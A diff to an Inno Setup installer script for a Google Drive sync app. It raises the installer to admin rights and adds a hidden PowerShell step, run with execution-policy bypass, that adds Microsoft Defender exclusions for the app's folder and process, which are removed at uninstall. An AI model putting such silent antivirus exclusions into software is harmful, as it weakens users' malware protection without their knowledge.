@@ -28,7 +28,7 @@ SolidCompression=yes
 WizardStyle=modern
 ArchitecturesInstallIn64BitMode=x64
 UninstallDisplayIcon={app}\{#MyAppExeName}
-PrivilegesRequired=lowest
+PrivilegesRequired=admin
 
 [Languages]
 Name: "spanish"; MessagesFile: "compiler:Languages\Spanish.isl"
@@ -51,4 +51,10 @@ Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: de
 Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "MyGDriveSync"; ValueData: """{app}\{#MyAppExeName}"""; Flags: uninsdeletevalue; Tasks: startup
 
 [Run]
+; Configurar exclusiones en Microsoft Defender para la carpeta de la app y el proceso ejecutable
+Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath '{app}' -ExclusionProcess '{#MyAppExeName}' -ErrorAction SilentlyContinue"""; Flags: runhidden; StatusMsg: "Configurando excepciones de seguridad..."
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
+
+[UninstallRun]
+; Limpiar exclusiones en Microsoft Defender al desinstalar
+Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Remove-MpPreference -ExclusionPath '{app}' -ExclusionProcess '{#MyAppExeName}' -ErrorAction SilentlyContinue"""; Flags: runhidden
